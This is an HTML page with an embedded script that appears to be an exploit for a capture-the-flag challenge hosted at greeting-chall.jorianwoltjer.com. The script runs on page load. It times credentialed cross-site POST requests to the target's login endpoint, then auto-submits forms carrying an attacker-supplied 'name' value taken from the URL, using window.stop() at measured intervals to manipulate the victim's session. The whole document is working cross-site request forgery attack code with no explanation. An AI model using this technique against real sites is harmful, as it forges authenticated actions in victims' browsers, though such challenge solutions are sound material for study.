<body></body>
<script>
  (async () => {
    const target = "https://greeting-chall.jorianwoltjer.com/login";
    const params = new URLSearchParams(location.search);

    await fetch(target, {
      mode: "no-cors",
      method: "POST",
      credentials: "include",
    });

    var start = performance.now();
    await fetch(target, {
      mode: "no-cors",
      method: "POST",
      credentials: "include",
    });
    const time = performance.now() - start;
    console.log("The request took %d ms.", time);

    const interval = time * 1.333;
    console.log("Interval: %d ms.", interval);
    let timeout = interval;
    
    let plis = params.get("stop") === "true";
    for (let i = 0 + plis; i < 2 * plis + 1; i++) {
        const form = document.createElement("form");
        form.action = `${target}`;
        form.method = "post";
        
        const input = document.createElement("input");
        input.name = "name";
        input.value = params.get("h")
        input.type = "text";
        form.appendChild(input);

        document.body.appendChild(form);
        form.submit();
        console.log(1)
        await new Promise((resolve) => setTimeout(resolve, interval));
        console.log(params.get("stop"))
        if(params.get("stop") === "true"){
        console.log("stopping")
        window.stop();
        
        }
    }
      
  })();
</script>